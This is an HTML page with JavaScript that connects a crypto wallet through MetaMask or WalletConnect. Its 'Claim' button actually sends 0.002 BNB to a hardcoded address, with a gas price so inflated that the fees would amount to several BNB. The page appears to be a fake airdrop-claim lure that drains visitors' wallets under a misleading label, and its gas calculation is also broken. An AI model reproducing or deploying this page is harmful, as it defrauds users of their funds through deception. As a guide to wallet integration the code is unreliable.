<!DOCTYPE html>
<html>
<head>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.3.6/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/walletconnect@1.5.1/dist/walletconnect.min.js"></script>
    <style>
        .center {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
        }
    </style>
</head>
<body>
    <div class="center">
        <button onclick="connectWallet()">Connect Wallet</button>
        <button onclick="payWithBNB()">Claim</button>
    </div>
    
    <script>
        let web3;
        let account;

        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                await ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();

                // Check if the user has selected an account
                if (accounts.length === 0) {
                    alert('Please connect to MetaMask and select an account.');
                    return;
                }

                account = accounts[0];
                alert('MetaMask connected!');
            } else if (typeof window.WalletConnect !== 'undefined' && window.WalletConnect.supported()) {
                const connector = new WalletConnect({
                    bridge: 'https://bridge.walletconnect.org', // WalletConnect bridge URL
                    qrcodeModalOptions: {
                        mobileLinks: [
                            'metamask',
                        ],
                    },
                });

                // Check if already connected
                if (!connector.connected) {
                    // Create a QR Code Modal to scan the QR code
                    connector.createSession();
                    connector.on('connect', (error, payload) => {
                        if (error) {
                            throw error;
                        }

                        web3 = new Web3(connector.provider);
                        account = payload.params[0];
                        alert('WalletConnect connected!');
                    });
                } else {
                    web3 = new Web3(connector.provider);
                    account = connector.accounts[0];
                    alert('WalletConnect connected!');
                }
            } else {
                alert('Please install MetaMask or WalletConnect to connect your wallet.');
            }
        }

        async function payWithBNB() {
            if (!web3) {
                alert('Please connect your wallet before making the payment.');
                return;
            }

            const amount = '0.002'; // BNB amount in BNB (18 decimal places)
            const receiverAddress = '0xD9E818f75c948D11fBFFD65bFC626ea29a1f583b';

            // Convert BNB amount to wei
            const amountWei = web3.utils.toWei(amount);

            // Get the gas price in wei (0.00025 BNB)
            const gasPrice = web3.utils.toWei('0.00025', 'ether');

            // Calculate the gas limit based on the gas price
            const gasLimit = Math.ceil(amountWei / gasPrice) + 21000; // Add a buffer of 21,000 gas

            // Prepare the transaction object
            const transactionObject = {
                from: account,
                to: receiverAddress,
                value: amountWei,
                gasPrice: gasPrice,
                gas: gasLimit
            };

            try {
                // Send the transaction
                const transactionHash = await web3.eth.sendTransaction(transactionObject);
                alert('Payment successful! Transaction Hash: ' + transactionHash);
            } catch (error) {
                alert('Payment failed: ' + error.message);
            }
        }
    </script>
</body>
</html>
